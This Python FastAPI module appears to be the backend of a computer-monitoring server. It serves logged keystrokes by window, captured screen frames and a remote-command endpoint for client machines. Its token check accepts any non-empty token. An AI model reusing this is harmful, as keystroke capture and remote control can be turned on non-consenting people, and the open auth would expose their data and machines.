"""
REST API endpoints for the monitoring server.
Provides HTTP endpoints for managing computers and retrieving data.
"""

from fastapi import APIRouter, HTTPException, Query, Depends
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
from typing import List, Optional
from datetime import datetime
import logging

logger = logging.getLogger(__name__)

router = APIRouter()
security = HTTPBearer()


# Simple JWT verification (in production, use proper JWT library)
def verify_token(credentials: HTTPAuthorizationCredentials = Depends(security)):
    """
    Verify JWT token (simplified for demo).
    In production, implement proper JWT validation.
    """
    token = credentials.credentials
    # For demo, accept any non-empty token
    # In production, validate with proper JWT library
    if not token:
        raise HTTPException(status_code=401, detail="Invalid token")
    return token


def get_database():
    """Dependency to get database instance."""
    try:
        from .database import get_database
    except ImportError:
        from database import get_database
    return get_database()


def get_connection_manager():
    """Dependency to get connection manager."""
    try:
        from .websocket import get_connection_manager
    except ImportError:
        from websocket import get_connection_manager
    return get_connection_manager()


# Computer endpoints

@router.get("/api/computers")
async def get_computers(
    online_only: bool = Query(False, description="Filter by online status"),
    search: Optional[str] = Query(None, description="Search by name or MAC"),
    db = Depends(get_database),
    token: str = Depends(verify_token)
):
    """
    Get all computers.
    
    Args:
        online_only: Filter to only online computers
        search: Search query for computer name or MAC address
        db: Database instance
        token: Auth token
        
    Returns:
        List of computers
    """
    try:
        if search:
            computers = db.search_computers(search)
        else:
            computers = db.get_all_computers(online_only=online_only)
        
        # Add connection status
        manager = get_connection_manager()
        for computer in computers:
            computer["connected"] = manager.is_client_connected(computer["id"])
        
        return {"computers": computers, "count": len(computers)}
    except Exception as e:
        logger.error(f"Error getting computers: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.get("/api/computers/{computer_id}")
async def get_computer(
    computer_id: int,
    db = Depends(get_database),
    token: str = Depends(verify_token)
):
    """
    Get a specific computer by ID.
    
    Args:
        computer_id: Computer ID
        db: Database instance
        token: Auth token
        
    Returns:
        Computer details
    """
    try:
        computer = db.get_computer(computer_id)
        if not computer:
            raise HTTPException(status_code=404, detail="Computer not found")
        
        # Add connection status and cached info
        manager = get_connection_manager()
        computer["connected"] = manager.is_client_connected(computer_id)
        computer["stats"] = manager.get_stats(computer_id)
        
        return computer
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error getting computer {computer_id}: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.get("/api/computers/{computer_id}/keyboard-events")
async def get_keyboard_events(
    computer_id: int,
    limit: int = Query(100, ge=1, le=1000, description="Maximum events to return"),
    offset: int = Query(0, ge=0, description="Offset for pagination"),
    start_time: Optional[str] = Query(None, description="Start time filter (ISO format)"),
    end_time: Optional[str] = Query(None, description="End time filter (ISO format)"),
    window_filter: Optional[str] = Query(None, description="Filter by window name"),
    db = Depends(get_database),
    token: str = Depends(verify_token)
):
    """
    Get keyboard events for a computer.
    
    Args:
        computer_id: Computer ID
        limit: Maximum number of events
        offset: Pagination offset
        start_time: Optional start time filter
        end_time: Optional end time filter
        window_filter: Optional window name filter
        db: Database instance
        token: Auth token
        
    Returns:
        List of keyboard events
    """
    try:
        # Verify computer exists
        computer = db.get_computer(computer_id)
        if not computer:
            raise HTTPException(status_code=404, detail="Computer not found")
        
        events = db.get_keyboard_events(
            computer_id=computer_id,
            limit=limit,
            offset=offset,
            start_time=start_time,
            end_time=end_time,
            window_filter=window_filter
        )
        
        return {"events": events, "count": len(events)}
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error getting keyboard events for computer {computer_id}: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.get("/api/computers/{computer_id}/frames")
async def get_frames(
    computer_id: int,
    limit: int = Query(10, ge=1, le=100, description="Maximum frames to return"),
    offset: int = Query(0, ge=0, description="Offset for pagination"),
    db = Depends(get_database),
    token: str = Depends(verify_token)
):
    """
    Get frame records for a computer.
    
    Args:
        computer_id: Computer ID
        limit: Maximum number of frames
        offset: Pagination offset
        db: Database instance
        token: Auth token
        
    Returns:
        List of frame records
    """
    try:
        # Verify computer exists
        computer = db.get_computer(computer_id)
        if not computer:
            raise HTTPException(status_code=404, detail="Computer not found")
        
        frames = db.get_frames(
            computer_id=computer_id,
            limit=limit,
            offset=offset
        )
        
        return {"frames": frames, "count": len(frames)}
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error getting frames for computer {computer_id}: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/api/computers/{computer_id}/command")
async def send_command(
    computer_id: int,
    command: str,
    params: Optional[dict] = None,
    manager = Depends(get_connection_manager),
    token: str = Depends(verify_token)
):
    """
    Send a command to a specific computer.
    
    Args:
        computer_id: Computer ID
        command: Command to send
        params: Optional command parameters
        manager: Connection manager
        token: Auth token
        
    Returns:
        Command status
    """
    try:
        if not manager.is_client_connected(computer_id):
            raise HTTPException(status_code=404, detail="Computer not connected")
        
        await manager.send_command_to_client(computer_id, command, **(params or {}))
        
        return {"status": "sent", "computer_id": computer_id, "command": command}
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error sending command to computer {computer_id}: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.get("/api/stats")
async def get_server_stats(
    db = Depends(get_database),
    manager = Depends(get_connection_manager),
    token: str = Depends(verify_token)
):
    """
    Get server statistics.
    
    Args:
        db: Database instance
        manager: Connection manager
        token: Auth token
        
    Returns:
        Server statistics
    """
    try:
        all_computers = db.get_all_computers()
        online_computers = db.get_all_computers(online_only=True)
        connection_counts = manager.get_connection_count()
        
        return {
            "total_computers": len(all_computers),
            "online_computers": len(online_computers),
            "connected_clients": connection_counts["clients"],
            "connected_dashboards": connection_counts["dashboards"],
            "timestamp": datetime.utcnow().isoformat()
        }
    except Exception as e:
        logger.error(f"Error getting server stats: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/api/cleanup")
async def cleanup_old_data(
    keyboard_days: int = Query(7, ge=1, description="Days of keyboard events to keep"),
    frame_days: int = Query(1, ge=1, description="Days of frames to keep"),
    db = Depends(get_database),
    token: str = Depends(verify_token)
):
    """
    Clean up old data from the database.
    
    Args:
        keyboard_days: Days of keyboard events to keep
        frame_days: Days of frames to keep
        db: Database instance
        token: Auth token
        
    Returns:
        Cleanup status
    """
    try:
        db.cleanup_old_data(keyboard_days=keyboard_days, frame_days=frame_days)
        
        return {
            "status": "success",
            "keyboard_days_retained": keyboard_days,
            "frame_days_retained": frame_days
        }
    except Exception as e:
        logger.error(f"Error cleaning up data: {e}")
        raise HTTPException(status_code=500, detail=str(e))
